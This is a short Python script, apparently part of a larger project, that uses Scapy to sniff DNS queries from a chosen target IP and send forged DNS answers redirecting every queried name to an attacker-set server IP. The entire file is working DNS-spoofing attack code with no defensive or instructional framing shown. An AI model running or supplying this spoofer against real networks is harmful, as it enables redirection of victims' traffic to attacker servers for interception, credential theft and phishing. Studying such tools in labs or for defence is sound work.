from scapy.all import *
from scapy_functions import *

target_ip = ""
server_ip = ""

def dns_sniffer(t_ip, s_ip):
    global target_ip, server_ip
    target_ip = t_ip
    server_ip = s_ip
    sniff(filter="udp and port 53 and host " + target_ip, prn = dns_spoofer)

def dns_spoofer(pkt):
    global target_ip, server_ip

    if (pkt[IP].src == target_ip and pkt.haslayer(DNS) and pkt[DNS].qr == 0 and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0):
        ip = IP(src = pkt[IP].dst, dst = pkt[IP].src)
        udp = UDP(dport = pkt[UDP].sport, sport = 53)
        dns = DNS(id = pkt[DNS].id, ancount = 1, qr = 1, ra = 1, qd = (pkt.getlayer(DNS)).qd, 
		an = DNSRR(rrname = pkt[DNSQR].qname, rdata = server_ip, ttl = 10)) #Set the answer of the request
        dns_response =  ip/udp/dns
        send(dns_response, verbose=0)